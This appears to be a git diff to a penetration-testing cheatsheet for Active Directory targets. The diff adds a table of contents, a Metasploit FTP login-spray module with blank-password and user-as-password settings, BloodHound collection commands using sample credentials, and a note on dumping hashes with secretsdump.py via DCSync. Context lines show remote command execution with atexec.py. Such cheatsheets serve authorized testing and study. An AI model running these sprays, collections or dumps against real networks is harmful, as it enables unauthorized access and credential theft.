@@ -2,6 +2,12 @@
 
 This is specifically for AD targets. There is also a [generic SMB recon cheatsheet](../network_recon/smb.md)
 
+* [Enumeration](#enumeration)
+* [Credential Spray](#credential-spray)
+* [Impacket Toolkit](#impacket-toolkit)
+* [Bloodhound](#bloodhound)
+* [Manual LDAP](#manual-ldap)
+
 ## Enumeration
 
 ```bash
@@ -67,7 +73,9 @@ Check smb and winrm login spray if the ports are open (smb 139/445; winrm 5985).
 # metasploit modules
 msf> use scanner/winrm/winrm_login
 msf> use scanner/smb/smb_login
+msf> use auxiliary/scanner/ftp/ftp_login
 
+# useful settings to turn on
 set BLANK_PASSWORDS true
 set USER_AS_PASS true
 ```
@@ -150,6 +158,31 @@ RCE via Task Scheduler Service:
 ```bash
 atexec.py DOMAIN/username:password@host whoami
 ```
+
+## Bloodhound
+
+> BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify.
+
+Start bloodhound
+```bash
+sudo neo4j console
+bloodhound
+```
+
+Remote collect sharphound data:
+```bash
+# Bloodhound collector (rpc/user login required)
+pip install bloodhound
+python3 -m bloodhound -u 's.smith' -p 'password' -d somedomain.local -ns 10.10.10.10 -c ALL
+```
+
+Clear the db (if necessary) and import the files collected by the sharphound binary or the remote python collector.
+
+
+### Notes
+
+* Users with DCSync privileges should be able to perform `secretsdump.py`
+
 
 ## Manual LDAP
 
